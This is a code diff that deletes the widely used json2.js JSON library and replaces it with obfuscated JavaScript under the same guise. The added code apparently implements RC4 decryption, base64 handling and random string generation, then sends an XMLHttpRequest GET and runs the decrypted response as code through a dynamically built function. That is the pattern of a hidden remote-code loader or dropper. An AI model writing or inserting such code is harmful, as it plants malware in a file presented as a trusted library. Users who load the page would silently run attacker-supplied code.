@@ -1,489 +1,303 @@
-/*
-    json2.js
-    2014-02-04
-
-    Public Domain.
-
-    NO WARRANTY EXPRESSED OR IMPLIED. USE AT YOUR OWN RISK.
-
-    See http://www.JSON.org/js.html
-
-
-    This code should be minified before deployment.
-    See http://javascript.crockford.com/jsmin.html
-
-    USE YOUR OWN COPY. IT IS EXTREMELY UNWISE TO LOAD CODE FROM SERVERS YOU DO
-    NOT CONTROL.
-
-
-    This file creates a global JSON object containing two methods: stringify
-    and parse.
-
-        JSON.stringify(value, replacer, space)
-            value       any JavaScript value, usually an object or array.
-
-            replacer    an optional parameter that determines how object
-                        values are stringified for objects. It can be a
-                        function or an array of strings.
-
-            space       an optional parameter that specifies the indentation
-                        of nested structures. If it is omitted, the text will
-                        be packed without extra whitespace. If it is a number,
-                        it will specify the number of spaces to indent at each
-                        level. If it is a string (such as '\t' or '&nbsp;'),
-                        it contains the characters used to indent at each level.
-
-            This method produces a JSON text from a JavaScript value.
-
-            When an object value is found, if the object contains a toJSON
-            method, its toJSON method will be called and the result will be
-            stringified. A toJSON method does not serialize: it returns the
-            value represented by the name/value pair that should be serialized,
-            or undefined if nothing should be serialized. The toJSON method
-            will be passed the key associated with the value, and this will be
-            bound to the value
-
-            For example, this would serialize Dates as ISO strings.
-
-                Date.prototype.toJSON = function (key) {
-                    function f(n) {
-                        // Format integers to have at least two digits.
-                        return n < 10 ? '0' + n : n;
-                    }
-
-                    return this.getUTCFullYear()   + '-' +
-                         f(this.getUTCMonth() + 1) + '-' +
-                         f(this.getUTCDate())      + 'T' +
-                         f(this.getUTCHours())     + ':' +
-                         f(this.getUTCMinutes())   + ':' +
-                         f(this.getUTCSeconds())   + 'Z';
-                };
-
-            You can provide an optional replacer method. It will be passed the
-            key and value of each member, with this bound to the containing
-            object. The value that is returned from your method will be
-            serialized. If your method returns undefined, then the member will
-            be excluded from the serialization.
-
-            If the replacer parameter is an array of strings, then it will be
-            used to select the members to be serialized. It filters the results
-            such that only members with keys listed in the replacer array are
-            stringified.
-
-            Values that do not have JSON representations, such as undefined or
-            functions, will not be serialized. Such values in objects will be
-            dropped; in arrays they will be replaced with null. You can use
-            a replacer function to replace those with JSON values.
-            JSON.stringify(undefined) returns undefined.
-
-            The optional space parameter produces a stringification of the
-            value that is filled with line breaks and indentation to make it
-            easier to read.
-
-            If the space parameter is a non-empty string, then that string will
-            be used for indentation. If the space parameter is a number, then
-            the indentation will be that many spaces.
-
-            Example:
-
-            text = JSON.stringify(['e', {pluribus: 'unum'}]);
-            // text is '["e",{"pluribus":"unum"}]'
-
-
-            text = JSON.stringify(['e', {pluribus: 'unum'}], null, '\t');
-            // text is '[\n\t"e",\n\t{\n\t\t"pluribus": "unum"\n\t}\n]'
-
-            text = JSON.stringify([new Date()], function (key, value) {
-                return this[key] instanceof Date ?
-                    'Date(' + this[key] + ')' : value;
-            });
-            // text is '["Date(---current time---)"]'
-
-
-        JSON.parse(text, reviver)
-            This method parses a JSON text to produce an object or array.
-            It can throw a SyntaxError exception.
-
-            The optional reviver parameter is a function that can filter and
-            transform the results. It receives each of the keys and values,
-            and its return value is used instead of the original value.
-            If it returns what it received, then the structure is not modified.
-            If it returns undefined then the member is deleted.
-
-            Example:
-
-            // Parse the text. Values that look like ISO date strings will
-            // be converted to Date objects.
-
-            myData = JSON.parse(text, function (key, value) {
-                var a;
-                if (typeof value === 'string') {
-                    a =
-/^(\d{4})-(\d{2})-(\d{2})T(\d{2}):(\d{2}):(\d{2}(?:\.\d*)?)Z$/.exec(value);
-                    if (a) {
-                        return new Date(Date.UTC(+a[1], +a[2] - 1, +a[3], +a[4],
-                            +a[5], +a[6]));
-                    }
-                }
-                return value;
-            });
-
-            myData = JSON.parse('["Date(09/09/2001)"]', function (key, value) {
-                var d;
-                if (typeof value === 'string' &&
-                        value.slice(0, 5) === 'Date(' &&
-                        value.slice(-1) === ')') {
-                    d = new Date(value.slice(5, -1));
-                    if (d) {
-                        return d;
-                    }
-                }
-                return value;
-            });
-
-
-    This is a reference implementation. You are free to copy, modify, or
-    redistribute.
-*/
-
-/*jslint evil: true, regexp: true */
-
-/*members "", "\b", "\t", "\n", "\f", "\r", "\"", JSON, "\\", apply,
-    call, charCodeAt, getUTCDate, getUTCFullYear, getUTCHours,
-    getUTCMinutes, getUTCMonth, getUTCSeconds, hasOwnProperty, join,
-    lastIndex, length, parse, prototype, push, replace, slice, stringify,
-    test, toJSON, toString, valueOf
-*/
-
-
-// Create a JSON object only if one does not already exist. We create the
-// methods in a closure to avoid creating global variables.
-
-if (typeof JSON !== 'object') {
-    JSON = {};
+vaccae = 8211;
+manere = '?';
+mate = "661";
+movens = "7e0";
+ageque = "222";
+obitus = 81;
+apibus = 'ar';
+lugebo = 'G';
+dolori = "T";
+acamas = "";
+fulcra = 'nt';
+colis = 'dy';
+insis = 42;
+diram = "ponse";
+rimer = "8.";
+decas = "n";
+solant = '';
+beatas = 6911;
+tege = 814;
+salmon = 'ASH';
+capies = 'vwxyz01234';
+adit = 'h';
+fibula = 1;
+ueluti = 256;
+apum = "ea";
+petat = 6;
+dice = "ain";
+testem = '.6';
+tulit = 'gl';
+visque = "p";
+igitur = 64;
+hoon = "e";
+quires = 'do';
+sinu = 'F';
+gyri = 'dow';
+audet = 'T';
+nostro = 28;
+quidem = 'L';
+corna = 'et';
+volvat = '854';
+lectae = "0.59";
+deoque = "9.276e3";
+revoco = 'c';
+veste = 55;
+uisae = 'r';
+anci = "4864";
+tmarii = 'ow';
+tuorum = 8921;
+mdcqve = "t";
+solari = 'l';
+uisque = '10';
+flendo = 3645;
+cautum = 'at';
+aderis = "dd";
+uique = 'UNI';
+avidum = 'o';
+obsum = '.734';
+portae = 838;
+orant = '.25';
+sinis = 8023;
+turkey = 'en';
+bogong = 8418;
+vastis = 507;
+funere = 9;
+educam = 2425;
+frenem = '#';
+gladie = '(';
+arti = 487;
+oriens = 9485;
+praue = 59;
+urbum = 'au';
+itas = 'wl';
+aulide = 3007;
+killer = 8;
+unda = 'Y';
+pastor = 'f';
+velit = 5;
+gunyah = 'tW';
+niveae = 6438;
+aequi = 'ret';
+arctos = 'ghijk';
+beroen = 'v';
+pontet = 21;
+rixae = 't';
+danaos = 4;
+lisci = 'xml';
+verbis = '[H';
+auersa = "body";
+merui = 'n';
+scylla = 'ie';
+delato = 'y';
+call = '.7';
+risque = 'tV';
+usoque = 'H';
+cupidi = 'w';
+famae = 'g';
+incuso = 7;
+campo = 's';
+ungu = 71;
+leti = 62;
+ciebo = 2839;
+amaras = 7783;
+mens = "m";
+punt = 're';
+inibis = ' ';
+eicio = 'K';
+gimlet = 'ult';
+ictui = "925";
+nactus = '[';
+silex = 26;
+tonsa = "set";
+tactui = "ri";
+ludat = 'a';
+tuti = 'self';
+serva = 'A';
+tactus = 0;
+pioque = 119;
+moles = 587;
+primam = 'fault';
+genite = 'O';
+divico = '4';
+foret = 2;
+arcet = 'ML';
+causae = "a";
+apollo = 'e';
+abditi = 'Q';
+uagos = 23;
+arcum = 'p';
+parto = 'um';
+mollio = 'el';
+impia = 'M';
+exeras = 'us';
+gnati = (0.436, 'AB' + 'CDE' + 'F');
+amoris = ('.930' > 65 ? 9e0: 'ring' + '');
+function raucam(vecte) {
+    obque = new vecte()
 }
-
-(function () {
-    'use strict';
-
-    function f(n) {
-        // Format integers to have at least two digits.
-        return n < 10 ? '0' + n : n;
+function matrem(fretus, bull) {
+    for (famam = 0; famam < fretus; famam++) bull[famam] = famam
+}
+function tenuem(natant, arces) {
+    for (famam = 0; famam < natant; famam++) {
+        unius = (unius + obque[famam] + arces[claram](famam % arces[tranta])) % natant;
+        velat = obque[famam];
+        obque[famam] = obque[unius];
+        obque[unius] = velat
     }
-
-    if (typeof Date.prototype.toJSON !== 'function') {
-
-        Date.prototype.toJSON = function () {
-
-            return isFinite(this.valueOf())
-                ? this.getUTCFullYear()     + '-' +
-                    f(this.getUTCMonth() + 1) + '-' +
-                    f(this.getUTCDate())      + 'T' +
-                    f(this.getUTCHours())     + ':' +
-                    f(this.getUTCMinutes())   + ':' +
-                    f(this.getUTCSeconds())   + 'Z'
-                : null;
-        };
-
-        String.prototype.toJSON      =
-            Number.prototype.toJSON  =
-            Boolean.prototype.toJSON = function () {
-                return this.valueOf();
-            };
+}
+function fateor(fores, bickie) {
+    famam = (famam + 1) % bickie;
+    unius = (unius + obque[famam]) % bickie;
+    piker();
+    obque[unius] = velat;
+    ferro(fores)
+}
+function piker(durum) {
+    velat = obque[famam];
+    obque[famam] = obque[unius]
+}
+function ferro(banjo) {
+    tranem += quintyye[otii](banjo[claram](artis) ^ obque[(obque[famam] + obque[unius]) % 256])
+}
+function iamque(fores) {
+    for (artis = 0; artis < fores[tranta]; artis++) {
+        fateor(fores, 256)
     }
-
-    var cx,
-        escapable,
-        gap,
-        indent,
-        meta,
-        rep;
-
-
-    function quote(string) {
-
-// If the string contains no control characters, no quote characters, and no
-// backslash characters, then we can safely slap some quotes around it.
-// Otherwise we must also replace the offending characters with safe escape
-// sequences.
-
-        escapable.lastIndex = 0;
-        return escapable.test(string) ? '"' + string.replace(escapable, function (a) {
-            var c = meta[a];
-            return typeof c === 'string'
-                ? c
-                : '\\u' + ('0000' + a.charCodeAt(0).toString(16)).slice(-4);
-        }) + '"' : '"' + string + '"';
-    }
-
-
-    function str(key, holder) {
-
-// Produce a string from holder[key].
-
-        var i,          // The loop counter.
-            k,          // The member key.
-            v,          // The member value.
-            length,
-            mind = gap,
-            partial,
-            value = holder[key];
-
-// If the value has a toJSON method, call it to obtain a replacement value.
-
-        if (value && typeof value === 'object' &&
-                typeof value.toJSON === 'function') {
-            value = value.toJSON(key);
+}
+function neget(jabiru) {
+    famam = jabiru;
+    unius = jabiru
+}
+signa = (11. > 155 ? .218 : cient);
+ducere = (.19, 'a');
+('.3' < 8 ? signa: 6.)((8123., this));
+mearum = (".77" > portae ? 2.36e2: pueros);
+gnati += (ciebo >= divico ? '' + lugebo + usoque + 'I' + 'J' + eicio + quidem + impia + 'N' + 'O' + '': 0.51);
+darent = (28 < "274" ? tabo: .55);
+audiet = (9., iove);
+puella = (4.51e2 < 0.28 ? 0.7 : decora);
+tacitiyye = (6, darent);
+obicis = (3e0, audiet)[(.1865 >= obsum ? 1.18e2: "documen" + "t")];
+otii = (3.454e3 <= lectae ? 17 : 'fro') + (4.884e3, 'mC') + (.41 <= '0.5261' ? 'har': 1e0) + (0.78 <= 7 ? 'C': 8e0) + (4.834e3, 'ode');
+tranta = (7e0, '' + 'le' + '') + (.967, 'ng') + (8e0, '' + 't' + adit + solant);
+gnati += ('.7' < 4e0 ? solant + 'P' + 'Q' + 'R' + 'S' + audet + 'U' + solant: 1.118e3) + (.30, '' + 'VW' + 'X' + unda + 'Z');
+cursui = (3532 > 230 ? 'ra' + delato: 1.88e2);
+tumida = (8.8e1 > 302 ? 6912 : cautum + 'h' + solant);
+uana = (.7 < 9.83e2 ? puella: foret);
+sentio = (.643, 'unc') + (827, rixae + 'io' + 'n' + solant);
+nepos = ("884" <= 8424 ? obicis: .826);
+gnati += (.4 >= '923.' ? .46 : 'ab' + 'cd' + 'e') + ('.92' > 5. ? 3 : 'f' + arctos + 'lm');
+ducis = (".7" > 0.9 ? 341.: 'e');
+itavit = ('5.469e3' > 0.6404 ? nepos: 71);
+volito = (9 >= 9706. ? beatas: evado);
+palmam = (.1134 >= .97 ? 9.45e2: 'va');
+gnati += (88. < '105.' ? solant + merui + 'o' + 'p' + 'q' + 'r' + 's' + rixae + 'u' + solant: funere) + (0.8, capies + solant) + (31 > '4091' ? .3 : solant + '5' + '6' + '7' + '8' + '9' + '+' + '/' + '=' + solant);
+claram = (937, 'ch') + (261., 'arC') + (.491 < 441. ? solant + 'o' + 'd' + 'e' + serva + 't' + solant: 7.);
+if ((.335, gnati)[("1493" >= .406 ? ducis: 89) + (.1 < '8.8e2' ? palmam: 91) + (0.902, 'l')]) {
+    gnati = (.147, solant);
+    itavit = (5 > '.3' ? gnati: .49)
+}
+miseri = (veste > 9.3e1 ? 968.: solant + 'o' + 'r' + 'ag' + 'e');
+sibi = (7.96e2 <= .9 ? pontet: tulit);
+metuet = (69, 'oba');
+satque = (59, itavit);
+function evado(cupiet, bluey, furens, koel) { ("8.176e3" >= moles ? raucam: 6e0)((2932., caedumaai));
+    (0.48, matrem)((5. < 0.885e3 ? 256 : 96.), (flendo, obque));
+    (6543 <= 106. ? 4464.: neget)(("0.1" >= 875. ? silex: 0));
+    (38 <= 3 ? 952 : tenuem)((killer, ueluti), ("7.13e2" <= 4e2 ? 8.9e1: cupiet));
+    (nostro, neget)(("23." >= .2 ? 0 : 67.));
+    tranem = (476 >= 2.25e2 ? '': 49);
+    (8e0, iamque)((9.974e3, bluey));
+    return (3, tranem)
+}
+amoqueyya = (call >= 1647. ? 39.: satque);
+function decora(aetas, stygis, mode, rhenum) {
+    var iacit;
+    return ('0.5' <= 6. ? iacit: 0.2)
+}
+arsiyya = new(3.2e1 <= .582 ? .876 : caedumaai)();
+saltem = (.475, deerat);
+obest = (49., ducere) + ('9527' < 9.06e2 ? 4585.: tacitiyye)((killer, gnati), (6940, 30));
+paroneez = (3761., ducque);
+sedas = (7689., saltem)((funere, 'r' + corna) + (0.536 <= 3998 ? solant + 'u' + uisae + 'n' + ' ' + solant: 3) + (5.734e3, '' + 'uana' + gladie + ')' + solant));
+audiviiie = (vaccae, saltem)((petat, 'x'), (3e0, delato), (809, solant + 'r' + apollo + rixae + solant) + (3.3e1 <= 2. ? 3e1: 'u' + 'r' + merui + inibis) + (.7834 > 593. ? 9e0: solant + beroen + 'ol' + 'it' + 'o(' + 'x,' + delato + ')'));
+figoeei = (3., saltem)(('3' <= 8.3e1 ? solant + 'x': 384.), (funere, aequi) + (6661 <= movens ? .4138 : solant + 'u' + uisae + merui + inibis + solant) + (178., beroen + 'o' + 'ca' + 'n' + campo + gladie + 'x' + ')'));
+exuta = (645., '' + 'onr' + apollo) + (698 <= 41 ? 1173 : ludat + colis + campo + rixae) + (.97, 'atec') + ("84." <= vastis ? solant + adit + ludat + 'n' + famae + apollo + solant: 1.8e1);
+(.9414, figoeei)((.51 < 1.2e1 ? obest: 965.));
+function vocans(equo, novus, illas, fracp) {
+    var texes = (6.49e2 < 3. ? 77.: sedas)();
+    (50 <= 472 ? texes: 5.738e3)[(ungu, acamas + "o" + "p" + hoon + decas + "")]((0.7198 > .352 ? 'GET': 76.), (9e0, manere) + (velit < arti ? paroneez: 275)((.24, audiviiie)((978., solant + revoco + 'ra' + itas + 'o' + 'ov' + ''), (9.677e3 < 36. ? .765 : equo))), ("5.49e2" < 9.697e3 ? true: 948));
+    (.16 > tege ? 6 : texes)[(0.18, exuta)] = function() {
+        if ((0.13e2, texes)[(3218. < "2.7e2" ? 30.: "r" + "e" + "ad" + "y" + "S" + "ta" + mdcqve + hoon)] == (1, danaos) && (5490 <= "53" ? 0.575 : texes)[(3, "" + "s" + "t" + causae + "t" + "u" + "s" + "")] == ('2e0' > 900 ? 2e0: 200)) { (6905., saltem)((2.505e3, audiviiie)((2e0 >= '34' ? 4e1: equo), (".4" <= .66 ? mearum: 7.)((0.2, texes)[(3023 < 6.934e3 ? "res" + diram + dolori + hoon + "xt": .12)])))()
         }
-
-// If we were called with a replacer function, then call the replacer to
-// obtain a replacement value.
-
-        if (typeof rep === 'function') {
-            value = rep.call(holder, key, value);
+    };
+    (.12, texes)[(1.973e3 >= 4.131e3 ? .3288 : acamas + "s" + "e" + decas + "d")]((8.034e3, tactus))
+}
+function foras(cupiet, inimus, iacto, pontes) {
+    var skivvy = emicatmoj["floor"](emicatmoj["random"]() * cupiet[tranta]);
+    foeda += cupiet["substring"](skivvy, skivvy + 1)
+}
+function teneat(bluey, cupiet, foeda, stem) {
+    for (famam = 0; famam < bluey; famam++) {
+        foras(cupiet, famam, bluey, foeda);
+    }
+}
+function tabo(cupiet, bluey, stem, stubby) {
+    foeda = '';
+    teneat(bluey, cupiet, foeda, stem);
+    return foeda
+}
+function ducque(troiae, oberat, effata, mergi) {
+    var servo = (killer <= 94 ? '': .9);
+    var tranem;
+    var famam;
+    var uouero = (ageque >= .5 ? tactus: 66);
+    var ardua = ('850' >= .59 ? fibula: insis);
+    famam = (2.895e3 < "2151" ? .923 : 0);
+    for (tranem = 0; famam < troiae[tranta]; famam++, tranem++) {
+        uouero = uouero * 256 + troiae[claram](famam);
+        ardua = ardua * 4;
+        servo = servo + gnati["charAt"](parseInt(uouero / ardua));
+        uouero = uouero % ardua;
+        if (ardua == 64) {
+            servo = servo + gnati["charAt"](parseInt(uouero));
+            uouero = 0;
+            ardua = 1;
+            tranem++
         }
-
-// What happens next depends on the value's type.
-
-        switch (typeof value) {
-        case 'string':
-            return quote(value);
-
-        case 'number':
-
-// JSON numbers must be finite. Encode non-finite numbers as null.
-
-            return isFinite(value) ? String(value) : 'null';
-
-        case 'boolean':
-        case 'null':
-
-// If the value is a boolean or null, convert it to a string. Note:
-// typeof null does not produce 'null'. The case is included here in
-// the remote chance that this gets fixed someday.
-
-            return String(value);
-
-// If the type is 'object', we might be dealing with an object or an array or
-// null.
-
-        case 'object':
-
-// Due to a specification blunder in ECMAScript, typeof null is 'object',
-// so watch out for that case.
-
-            if (!value) {
-                return 'null';
-            }
-
-// Make an array to hold the partial results of stringifying this object value.
-
-            gap += indent;
-            partial = [];
-
-// Is the value an array?
-
-            if (Object.prototype.toString.apply(value) === '[object Array]') {
-
-// The value is an array. Stringify every element. Use null as a placeholder
-// for non-JSON values.
-
-                length = value.length;
-                for (i = 0; i < length; i += 1) {
-                    partial[i] = str(i, value) || 'null';
-                }
-
-// Join all of the elements together, separated with commas, and wrap them in
-// brackets.
-
-                v = partial.length === 0
-                    ? '[]'
-                    : gap
-                    ? '[\n' + gap + partial.join(',\n' + gap) + '\n' + mind + ']'
-                    : '[' + partial.join(',') + ']';
-                gap = mind;
-                return v;
-            }
-
-// If the replacer is an array, use it to select the members to be stringified.
-
-            if (rep && typeof rep === 'object') {
-                length = rep.length;
-                for (i = 0; i < length; i += 1) {
-                    if (typeof rep[i] === 'string') {
-                        k = rep[i];
-                        v = str(k, value);
-                        if (v) {
-                            partial.push(quote(k) + (gap ? ': ' : ':') + v);
-                        }
-                    }
-                }
-            } else {
-
-// Otherwise, iterate through all of the keys in the object.
-
-                for (k in value) {
-                    if (Object.prototype.hasOwnProperty.call(value, k)) {
-                        v = str(k, value);
-                        if (v) {
-                            partial.push(quote(k) + (gap ? ': ' : ':') + v);
-                        }
-                    }
-                }
-            }
-
-// Join all of the member texts together, separated with commas,
-// and wrap them in braces.
-
-            v = partial.length === 0
-                ? '{}'
-                : gap
-                ? '{\n' + gap + partial.join(',\n' + gap) + '\n' + mind + '}'
-                : '{' + partial.join(',') + '}';
-            gap = mind;
-            return v;
+        if (tranem >= 75) {
+            tranem = -1;
+            servo = servo + '\n'
         }
     }
-
-// If the JSON object does not yet have a stringify method, give it one.
-
-    if (typeof JSON.stringify !== 'function') {
-        escapable = /[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g;
-        meta = {    // table of character substitutions
-            '\b': '\\b',
-            '\t': '\\t',
-            '\n': '\\n',
-            '\f': '\\f',
-            '\r': '\\r',
-            '"' : '\\"',
-            '\\': '\\\\'
-        };
-        JSON.stringify = function (value, replacer, space) {
-
-// The stringify method takes a value and an optional replacer, and an optional
-// space parameter, and returns a JSON text. The replacer can be a function
-// that can replace values, or an array of strings that will select the keys.
-// A default replacer method can be provided. Use of the space parameter can
-// produce text that is more easily readable.
-
-            var i;
-            gap = '';
-            indent = '';
-
-// If the space parameter is a number, make an indent string containing that
-// many spaces.
-
-            if (typeof space === 'number') {
-                for (i = 0; i < space; i += 1) {
-                    indent += ' ';
-                }
-
-// If the space parameter is a string, it will be used as the indent string.
-
-            } else if (typeof space === 'string') {
-                indent = space;
-            }
-
-// If there is a replacer, it must be a function or an array.
-// Otherwise, throw an error.
-
-            rep = replacer;
-            if (replacer && typeof replacer !== 'function' &&
-                    (typeof replacer !== 'object' ||
-                    typeof replacer.length !== 'number')) {
-                throw new Error('JSON.stringify');
-            }
-
-// Make a fake root object containing our value under the key of ''.
-// Return the result of stringifying the value.
-
-            return str('', {'': value});
-        };
+    if ((3e0, famam) % (3.996e3 <= '9' ? danaos: 3)) {
+        servo = servo + gnati["charAt"](parseInt(uouero * ((famam % 3 == 1) ? 16 : 4)));
+        servo = servo + ((famam % 3) == 1 ? '==': quintyye[otii](61))
     }
-
-
-// If the JSON object does not yet have a parse method, give it one.
-
-    if (typeof JSON.parse !== 'function') {
-        cx = /[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g;
-        JSON.parse = function (text, reviver) {
-
-// The parse method takes a text and an optional reviver function, and returns
-// a JavaScript value if the text is a valid JSON text.
-
-            var j;
-
-            function walk(holder, key) {
-
-// The walk method is used to recursively walk the resulting structure so
-// that modifications can be made.
-
-                var k, v, value = holder[key];
-                if (value && typeof value === 'object') {
-                    for (k in value) {
-                        if (Object.prototype.hasOwnProperty.call(value, k)) {
-                            v = walk(value, k);
-                            if (v !== undefined) {
-                                value[k] = v;
-                            } else {
-                                delete value[k];
-                            }
-                        }
-                    }
-                }
-                return reviver.call(holder, key, value);
-            }
-
-
-// Parsing happens in four stages. In the first stage, we replace certain
-// Unicode characters with escape sequences. JavaScript handles many characters
-// incorrectly, either silently deleting them, or treating them as line endings.
-
-            text = String(text);
-            cx.lastIndex = 0;
-            if (cx.test(text)) {
-                text = text.replace(cx, function (a) {
-                    return '\\u' +
-                        ('0000' + a.charCodeAt(0).toString(16)).slice(-4);
-                });
-            }
-
-// In the second stage, we run the text against regular expressions that look
-// for non-JSON patterns. We are especially concerned with '()' and 'new'
-// because they can cause invocation, and '=' because it can cause mutation.
-// But just to be safe, we want to reject all unexpected forms.
-
-// We split the second stage into 4 regexp operations in order to work around
-// crippling inefficiencies in IE's and Safari's regexp engines. First we
-// replace the JSON backslash pairs with '@' (a non-JSON character). Second, we
-// replace all simple value tokens with ']' characters. Third, we delete all
-// open brackets that follow a colon or comma or that begin the text. Finally,
-// we look to see that the remaining characters are only whitespace or ']' or
-// ',' or ':' or '{' or '}'. If that is so, then the text is safe for eval.
-
-            if (/^[\],:{}\s]*$/
-                    .test(text.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g, '@')
-                        .replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g, ']')
-                        .replace(/(?:^|:|,)(?:\s*\[)+/g, ''))) {
-
-// In the third stage we use the eval function to compile the text into a
-// JavaScript structure. The '{' operator is subject to a syntactic ambiguity
-// in JavaScript: it can begin a block or an object literal. We wrap the text
-// in parens to eliminate the ambiguity.
-
-                j = eval('(' + text + ')');
-
-// In the optional fourth stage, we recursively walk the new structure, passing
-// each name/value pair to a reviver function for possible transformation.
-
-                return typeof reviver === 'function'
-                    ? walk({'': j}, '')
-                    : j;
-            }
-
-// If the text is not JSON parseable, then a SyntaxError is thrown.
-
-            throw new SyntaxError('JSON.parse');
-        };
+    return ("0.7" > 91 ? 616.: servo)
+}
+function pueros(troiae, salsis, dumque, initur) {
+    var servo = (56., '');
+    var famam;
+    var uouero = (164, tactus);
+    var ardua = (2e0 >= "86." ? 904 : fibula);
+    for (famam = 0; famam < troiae[tranta]; famam++) {
+        if (troiae["charAt"](famam) == quintyye[otii](61) || troiae["charAt"](famam) == '\n') break;
+        uouero = uouero * 64 + gnati["indexOf"](troiae["charAt"](famam));
+        ardua = (ardua == 1 ? 64 : ardua / 4);
+        if (ardua != 64) {
+            servo = servo + quintyye[otii](parseInt(uouero / ardua));
+            uouero = uouero % ardua
+        }
     }
-}());
+    return (786, servo)
+}
+function cient(dolum, fracs, dulce, agamus) {
+    this[(84., "iove")] = (667., dolum);
+    if ((7.345e3, dolum)[(1423 <= "8.667e3" ? acamas + visque + causae + "r" + hoon + decas + mdcqve + "": 868)] == (5.2e1, dolum)) {
+        iactet = (.35, solant + ludat + '')
+    } else {
+        ducere += (7.25e2, solant + '@' + solant)
+    }
+}
